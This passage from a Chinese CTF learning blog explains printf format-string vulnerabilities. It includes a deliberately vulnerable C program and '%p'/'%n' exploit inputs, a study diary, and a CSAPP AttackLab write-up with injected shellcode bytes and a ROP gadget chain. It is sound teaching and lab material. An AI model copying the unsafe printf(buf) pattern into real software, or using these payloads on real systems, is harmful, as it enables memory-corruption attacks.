class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&lt;格式化字符串&gt;&quot;</span>, &lt;参量表&gt;);<br></code></pre></td></tr></table></figure><p>其中格式化字符串包括两部分内容: 一部分是正常字符, 这些字符将按原样输出; 另一部分是格式化规定字符, 以”%”开始, 后跟一个或几个规定字符,用来确定输出内容格式。参量表是需要输出的一系列参数, 其个数必须与格式化字符串所说明的输出参数个数一样多, 各参数之间用”,”分开, 且顺序一一对应, 否则将会出现意想不到的错误。</p><p>printf()函数的大家族：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">snprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vdprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsnprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_lis t ap)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>fprintf()按照格式字符串的内容将输出写入流中。三个参数为流、格式字符串和变参列表。</li><li>printf()等同于fprintf()，但是它假定输出流为stdout。 </li><li>sprintf()等同于fprintf()，但是输出不是写入流而是写入数组。在写入的字符串末尾必须添加一个空字符。</li><li>snprintf()等同于sprintf()，但是它指定了可写入字符的最大值size。当size大于零时，输出字符超过第size-1的部分会被舍弃而 不会写入数组中，在写入数组的字符串末尾会添加一个空字符。</li><li>dprintf()等同于fprintf()，但是它输出不是流而是一个文件描述符fd 。</li><li>vfprintf()、vprintf()、vsprintf()、vsnprintf()、vdprintf()分别与上面的函数对应，只是它们将变参列表换成了va_list类型的参数。</li></ul><h3 id="1-2-格式字符串format"><a href="#1-2-格式字符串format" class="headerlink" title="1.2 格式字符串format"></a>1.2 格式字符串format</h3><p>格式字符串是由普通字符（ordinary character，包括 % ）和转换规则（conversion specification）构成的字符序列。普通字符被原封不动地复制到输出流中。转换规则根据与实参对应的转换指示符对其进行转换，然后将结果写入输出流中。<br>一个转换规则有可选部分和必需部分组成：</p><pre><code>%[ 参数 ][ 标志 ][ 宽度 ][ .精度 ][ 长度 ] 转换指示符</code></pre><ul><li>（必需）转换指示符：</li></ul><table><thead><tr><th>字符</th><th align="left">描述</th></tr></thead><tbody><tr><td>d,i</td><td align="left">有符号十进制数值<code>int</code>。<code>%d</code> 与<code>%i </code>对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或<code>0</code>时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>u</td><td align="left">十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>f,F</td><td align="left"><code>double</code>型输出10进制定点表示。<code>f </code>与 <code>F</code> 差异是表示无穷与NaN时，<code>f</code>输出<code>inf</code>, <code>infinity</code>与 <code>nan</code>；<code>F</code> 输出<code>INF</code>, <code>INFINITY</code>与<code>NAN</code>。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td></tr><tr><td>e,E</td><td align="left"><code>double</code>值，输出形式为10进制的<code>([ - ]d.ddd e [ + / - ]ddd)</code>. E版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数<code>_set_output_format</code>修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td></tr><tr><td>g,G</td><td align="left"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。<code>g</code>使用小写字母，<code>G</code>使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td></tr><tr><td>x,X</td><td align="left">16进制<code>unsigned int</code>。<code>x</code>使用小写字母；<code>X</code>使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>o</td><td align="left">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>s</td><td align="left">如果没有用<code>l</code>标志，输出<code>null</code>结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了<code>l</code>标志，则对应函数参数指向<code>wchar_t</code>型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code> 函数。</td></tr><tr><td>c</td><td align="left">如果没有用<code>l</code>标志，把<code>int</code>参数转为<code>unsigned char</code>型输出；如果用了<code>l</code>标志，把<code>wint_t</code>参数转为包含两个元素的 <code>chart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为<code>null</code>宽字符。</td></tr><tr><td>p</td><td align="left">void*型，输出对应变量的值。 <code>printf(&quot;%p&quot;, a)</code>用地址的格式打印变量a的值， printf(“%p”, &amp;a) 打印变量a所在的地址。</td></tr><tr><td>a,A</td><td align="left">double<code>型的16进制表示，</code>[−]0xh.hhhh p±d<code>。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。</code>a<code>使用小写字母，</code>A`使用大写字母。</td></tr><tr><td>n</td><td align="left">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</td></tr><tr><td>%</td><td align="left"><code>% </code>字面值，不接受任何除了<code>参数</code>以外的部分。</td></tr></tbody></table><ul><li>（可选）参数 </li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td><code>n$</code></td><td><code>n</code>是用这个格式说明符显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。如果任意一个占位符使用了参数 ，则其他所有占位符必须也使用参数 。例：<code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)</code> 产生<code>17 0x11; 16 0x10</code></td></tr></tbody></table><p>剩下的略（有用再填）。</p><h3 id="1-3-在pwn中的应用"><a href="#1-3-在pwn中的应用" class="headerlink" title="1.3 在pwn中的应用"></a>1.3 在pwn中的应用</h3><p>看上去好像说，<code>printf</code>这个类型的函数只能输出啊。然而实际上，他有一个有趣的转换指示符，那就是：</p><p><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>我们测试一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//printfn.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>a = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1234567890%n\n&quot;</span>,&amp;a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc printfn.c -o printfn</span><br><span class="hljs-meta">$</span><span class="bash"> ./printfn</span> <br>a = 1<br>1234567890<br>a = 10<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>你看，仅用标准输出语句就成功改写了a的值！</p><p>说到这里已经很清楚了，我们可以通过修改<strong>参数</strong>的值，来改写<strong>该值所对应的地址的值</strong>，使程序执行发生错误。</p><p>比如以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//pwnit.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">80</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">int</span> *p = &amp;a;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br><span class="hljs-built_in">printf</span>(buf);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%x\n&quot;</span>,a);<br><span class="hljs-keyword">if</span>(a == <span class="hljs-number">0x10</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you pwn me!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译运行一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc pwnit.c -m32 -o pwnit</span><br>pwnit.c: In function ‘main’:<br>pwnit.c:8:9: warning: format not a string literal and no format arguments [-Wformat-security]<br>  printf(buf);<br>         ^<br><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span> <br>abcde<br>abcde<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>输入abcde似乎根本没用哦。。但是我们可以输入一个字符串看看，<code>int a = 5</code>这个变量声明在哪：</p><p>输入字符串：aaaa-%p-%p-%p-%p-%p-%p-%p-%p</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaa-%</span><span class="bash">p-%p-%p-%p-%p-%p-%p-%p-%p</span><br>aaaa-0x804a060-0xf75bca60-0x80485db-0x1-0x5-0xfff84494-0x4f3eea00-0xf77413dc-0xfff844c0<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>这个方法的重点在于：<strong>printf函数的参数是先被压入栈中后获取栈中的值或者地址作为参数的！</strong>当初没有想明白这个问题，困惑了好久。所以，我们发现，第5个参数的值是0x5，说明我们只要把第6个参数<code>（int* p）</code>改成0x10就可以了！</p><p>输入字符串：aaaaaaaaaaaaaaaa%6$n</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaaaaaaaaaaaaaa%</span><span class="bash">6<span class="hljs-variable">$n</span></span><br>aaaaaaaaaaaaaaaa<br>10<br>you pwn me!<br><span class="hljs-meta">$</span><br></code></pre></td></tr></table></figure><p>成功！</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sky_Learning_Daily</title>
    <link href="/2021-06/pwn-Sky-Learning-Daily/"/>
    <url>/2021-06/pwn-Sky-Learning-Daily/</url>
    
    <content type="html"><![CDATA[<h3 id="第0周-6-7-6-13"><a href="#第0周-6-7-6-13" class="headerlink" title="第0周:6/7-6/13"></a>第0周:6/7-6/13</h3><ul><li>11: 为了ida成功把kali2020.3整莫得了, 不想去研究怎么复原了, 直接重装了个kali2021.2, 以后一定弄<strong>快照</strong>.</li><li>12: 弄明白了cachelab的食用方法, 直接ctrlcv代码理解了下, 但是看起来还是有很多可以改进的地方, 暂时看不进去了. <ul><li>typora装的时候apt-key出问题, 其实还能用几年, 更modern的解决办法<a href="https://suay.site/?p=526">在这</a>(还没看).</li><li>问题列表还是Markdown靠谱, 思维导图线太多了, 用不上结构的优势, 除了笔记还是用md吧.</li></ul></li><li>13: 今天计划看看那啥buuoj的题目: 没看懂从哪开始, 还在wiki中<ul><li>typora linux版命令行启动好像有点问题</li><li>啥玩意儿啊, 根本不知道怎么开始做ctf题目-&gt;搞懂了ssh连接到靶机, 结果做到第二题发现是web, 请求学不到家干脆放弃了.</li><li>看了点讲座的内网穿透, 有丶意思, 可惜我没有这种需求</li></ul></li></ul><h3 id="第一周-6-14-6-20"><a href="#第一周-6-14-6-20" class="headerlink" title="第一周:6/14-6/20"></a>第一周:6/14-6/20</h3><ul><li>啥也没干, 复习周</li></ul><h3 id="第二周-6-21-6-27"><a href="#第二周-6-21-6-27" class="headerlink" title="第二周:6/21-6/27"></a>第二周:6/21-6/27</h3><p>……………..</p><h3 id="第一周-7-10-7-11"><a href="#第一周-7-10-7-11" class="headerlink" title="第一周:7/10-7/11"></a>第一周:7/10-7/11</h3><ul><li><strong>10,11: 直接盲选了一手系统安全, 要开始学逆向之类的东西了.</strong> <ul><li>看了看洛神的攻防世界的题解, 看了第一道题我就下载了pwntools ida peda这三个工具, 用了下checksec看看文件的类型, 再试了试nc命令连接到服务器, 运行一下就得到了flag</li><li>第二题是关于格式化字符串漏洞的, 看了老半天, 洛神直接写个很明显, 真不知道他写这个的时候是什么水平, 我还啥都不会呢. 哦对, 我看到一半他居然写了个python, 还是用的pwntools的接口, 人傻了, 明天入门python去, 然后再看看pwntools的python写法</li></ul></li></ul><h3 id="第二周-7-12-7-18"><a href="#第二周-7-12-7-18" class="headerlink" title="第二周:7/12-7/18"></a>第二周:7/12-7/18</h3><ul><li><p><strong>12:这周不做CG了, 开始研究CTF</strong>.</p><ul><li>今天先入门个python先.</li></ul></li><li><p><strong>13: 今天打算学习pwntools的用法</strong>.</p><ul><li>python看到了package,  看过了import, 各种基本类型的用法, 类还没看.</li><li><a href="https://pwntools.readthedocs.io/en/latest/tubes/sockets.html#module-pwnlib.tubes.remote"><code>pwnlib.tubes</code></a>, 这里有很多东西, 可以直接网页打开然后去搜函数, unpack()和pack()的作用是将数字打包成可输入的字符串</li><li>vscode装python还是挺简单的</li><li><code>%&lt; number&gt;$x</code> 是直接存放到第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.</li><li>在%10n是啥以及为啥要加‘AAAA’这些问题上卡了半天</li></ul></li><li><p><strong>14: IDA东西好多, 也看了看pwntools的文档, 特么也太多了</strong>.(level2整完了, 明天看看文档告别硬编码!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!(先会看再说))</p><ul><li><p><code>var_4 = dword ptr -4；</code>  这是解释代码，可解释成var_4 是 esp - 4处的空间;<br><code>var_0 = dword ptr 8;</code>      var_0 是 esp +8处的空间；</p><p><img src="https://i.loli.net/2021/07/19/LtySjIVDrhfwlk7.png"></p></li><li><p><code>/bin/bash</code>是个好东西, 如果能调用这个可以直接跳转到命令行模式, <code>interactive()</code>打开后就能发命令了</p><p><img src="https://i.loli.net/2021/07/19/TrCMBZjQpANFYhK.png"></p></li><li><p>将悬浮窗口复位: reset the desktop (md变成悬浮窗口就变不回去了??????????)</p><ul><li>芜湖, <strong>savedesktop</strong>还挺好用, 设置了一个我现在水平够用的default</li></ul></li><li><p>shift+F12: <u>strings window</u>.(还有f6,shift+f6,alt+f3)</p></li><li><p>汇编语言<a href="https://blog.csdn.net/weixin_43229030/article/details/106799580#15_comment_field_166">伪指令</a>.   a db 17 dup(?)的<a href="https://zhidao.baidu.com/question/2198876873686806628.html">含义</a>.</p></li><li><p>奇怪的信息: </p><img src="https://i.loli.net/2021/07/19/pYrMl7BxPmhfzUs.png" style="zoom: 50%;" /></li><li><p>python: next()函数和search()的返回是一个可迭代的类型</p></li><li><p><em><strong><u>在32位程序运行中，函数参数直接压入栈中</u></strong></em>,(还能这样???????????????????????????????????)</p><p>调用函数时栈的结构为:调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;…-&gt;参数1</p></li></ul></li><li><p><strong>15: 上午还是IDA的使用, 下午再看文档. 下午也没看,</strong> .</p><ul><li>return __readfsqword(0x28u) ^ v4; 这个是金丝雀值canary的检测</li><li><u><em>重启大法好</em></u>.(好个屁, 还是没解决)</li><li>千万别把文件名称命名为模块名称, 不然会出错.</li><li>sendlineafter的 <strong>“\n”</strong>一定要看清楚了再加</li><li>函数栈帧的构建过程, <strong>会把ebp推到栈上</strong>.</li><li>看看Jump菜单里的快捷键!</li><li>刚进入函数时, 栈顶是返回地址!</li></ul></li><li><p><strong>16: 今天不知道能做多少, 早上姑且整完了adworld的writeup, 下午晚上看情况, 开始buuoj</strong>,.</p><ul><li><p>看了剩下的tutorial, 一些看不懂, 有用到再说吧</p></li><li><p>RWX权限: r代表读权限，w代表写权限，x代表执行权限</p><p>相关的<a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod命令</a>.</p></li><li><p><a href="https://blog.csdn.net/weixin_43655282/article/details/105334313">retn</a>与堆栈平衡.</p></li></ul></li><li><p><strong>17: 今天在动车上姑且做到了第七题, 并且下载好了LibcSearcher库, 明天开始拿下第七题</strong>.</p><ul><li>看懂了python2和python3中的字符串的<a href="https://blog.csdn.net/sinat_38682860/article/details/91046433">区别</a>(复习了<a href="https://www.zhihu.com/question/23374078">Unicode和UTF-8</a>), python3 加上的就是这两种类型<strong>不能混用</strong>.</li><li>整明白了eip寄存器(<a href="https://www.cnblogs.com/xiangtingshen/p/11089563.html">1</a>,  <a href="https://www.k2zone.cn/?p=1911">2</a>)和堆栈平衡的东西, 明天再写篇文档顺便整理整理越来越多的md文件.</li></ul></li><li><p><strong>18:整了个blog, hexo+Github</strong>.</p></li></ul><h3 id="第三周-7-19-7-25"><a href="#第三周-7-19-7-25" class="headerlink" title="第三周: 7/19-7/25"></a>第三周: 7/19-7/25</h3><ul><li><strong>19: 终于弄完了github上的blog, 以后就这样发东西了</strong>.<ul><li>python3 -m pydoc -p 0 : 可以查看本地文档</li></ul></li><li><strong>20: 白天看python的语法, 看到了formatted_string, 晚上继续做题BUUOJ看LibcSearcher</strong>.<ul><li><strong><a href="https://blog.csdn.net/weixin_30414635/article/details/98030954">ROPgadgetDoc</a> or <a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">another</a></strong>.</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_Lab</title>
    <link href="/2021-05/Learning-CSAPP-Lab/"/>
    <url>/2021-05/Learning-CSAPP-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-LAB"><a href="#CSAPP-LAB" class="headerlink" title="CSAPP_LAB"></a>CSAPP_LAB</h1><h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><blockquote><p>要会使用hex2raw和ctarget和rtarget, 用管道符号比较方便.</p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>直接使用溢出的8字节改写为touch1的地址</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val)</span></span>&#123;<br>    vlevel = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (val == cookie)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0:48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi<br>9:68 ec 17 40 00       pushq  $0x4017ec<br>e:c3                   retq   <br></code></pre></td></tr></table></figure><p>此阶段需要执行栈上的代码, 在缓冲区里填充所写的代码后, 用gdb获得buf的栈顶, 覆盖getbuf的返回地址即可</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>touch3函数里调用了hexmatch(cookie, sval), sval是char*类型且为touch3的第一个变量, 作用是比较字符串sval和cookie是否相同, 所以在调用touch3之前需要将%rdi设置为cookie的字符串形式, 即ASCII码值, 程序的大致运行过程如下:</p><ol><li><p>test=&gt;getbuf, 40字节的栈空间存放攻击代码, 内容为: 设置%rdi, 将touch3地址推到栈上, ret. 溢出的8字节为getbuf返回地址, 改写为攻击代码的首地址.</p><img src="https://txc.gtimg.com/data/293750/2021/0719/afaadcb0e4f822d9c3f9a27ca83b01bf.png" alt="img" style="zoom:67%;" /></li><li><p>首地址获取方法: 用gdb调试设置断点到getbuf, 找到%rsp减去40后的值, 即为攻击代码地址</p></li><li><p>设置%rdi还要注意hexmatch的随机函数, 所以将输入的字符串存到getbuf返回地址的上方test代码段里, 与攻击代码距离40+8(返回地址)字节, 将该地址mov到%rdi里. 由于一次性使用程序, 不用关心test里的数据被改变</p></li></ol><h3 id="ROP-phase-4"><a href="#ROP-phase-4" class="headerlink" title="ROP: phase 4"></a>ROP: phase 4</h3><p>这一节实际上重复了phase2的任务, 但是使用了栈随机化和限制代码可执行区域, 所以采用ROP进行攻击.</p><p>使用objdump -s rtarget &gt; rtarget.s得到反汇编代码, 可以从handout中得知所需的gadget在以start_farm函数开始, 以mid_farm结束的一些函数中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401994 &lt;start_farm&gt;:<br>  401994:b8 01 00 00 00       mov    $0x1,%eax<br>  401999:c3                   retq  <br></code></pre></td></tr></table></figure><p>由于找不到直接pop %rdi的代码, 所以转向pop到其他寄存器然后mov到%rdi中, 这时候可以发现addval_219和addval_273中的58 90 c3, 48 89 c7 c3, 即pop %rax, mov %rax, %rdi(真tm就是直接找啊).</p><p>然后在buf里填充40字节空字符, 溢出的8字节定位到219, 从栈上pop出cookie, ret(0xc3)指令从栈上弹出一个地址即273的地址, 执行完mov后再ret, 最终跳转到touch2.</p><img src="https://p.qlogo.cn/zc_icon/0/e704802709d9ee3488bda1438861a0c716266897078366/0.png" style="zoom:60%;" /><p>exploit code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 ==&gt;40字节<br>ab 19 40 00 00 00 00 00<br>fa 97 b9 59 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ec 17 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>结束.</p><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>Official Warning : If you have other pressing obligations consider stopping right now.</p><p>重复了phase3的任务.Figure 3D就和nop一样, 不改变任何东西, 可以无视.</p></blockquote><p>由于使用了栈随机化, 又需要把cookie的地址放到栈上产生地址, 再存到%rdi中, 所以需要使用一些代码组合来产生一个固定偏移量的栈地址.<strong>有两种方法:</strong></p><ol><li><p>使用handout里面给出的那些编码, 代码较长所以才说费时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;in addval_190<br>movq %rsp,%rax<br>ret<br>;in addval_426<br>movq %rax,%rdi<br>ret<br>;in addval_219<br>popq %rax<br>ret<br>;in getval_481<br>movl %eax,%edx<br>ret<br>;in getval_159<br>movl %edx,%ecx<br>ret<br>;in addval_436<br>movl %ecx,%rsi<br>ret<br>;in add_xy<br>lea (%rdi,%rsi,1),%rax<br>retq <br>;in addval_426<br>movq %rax,%rdi<br>ret<br></code></pre></td></tr></table></figure><p>%rsp+80处放字符串，%rsp+8处才开始执行addval_190. 所以 <strong>(%rsp+80)-(%rsp+8)=72=0x48</strong></p></li><li><p>使用add指令的编码, 使得实际只需三行汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 